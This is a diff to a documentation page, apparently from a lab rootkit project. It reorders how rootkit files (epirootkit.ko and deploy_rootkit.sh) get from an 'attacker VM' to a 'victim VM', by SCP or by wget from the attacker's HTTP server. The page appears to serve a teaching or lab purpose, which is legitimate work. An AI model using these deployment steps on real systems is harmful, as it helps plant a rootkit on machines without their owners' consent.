@@ -30,13 +30,13 @@ weight: 204
 Receive rootkit files from attacker VM:
 
 ```bash
-# Option A: HTTP download
-wget http://192.168.200.11:8080/epirootkit.ko
-wget http://192.168.200.11:8080/deploy_rootkit.sh
-
-# Option B: SCP transfer (from attacker VM)
+# Option A: SCP transfer (from attacker VM)
 # First: sudo apt install -y openssh-server (inside victim VM)
 scp epirootkit.ko deploy_rootkit.sh victim@192.168.200.10:~/
+
+# Option B: HTTP download
+wget http://192.168.200.11:8080/epirootkit.ko
+wget http://192.168.200.11:8080/deploy_rootkit.sh
 
 # Option C: Web UI upload (In development)
 # Use attacker's web interface file transfer 
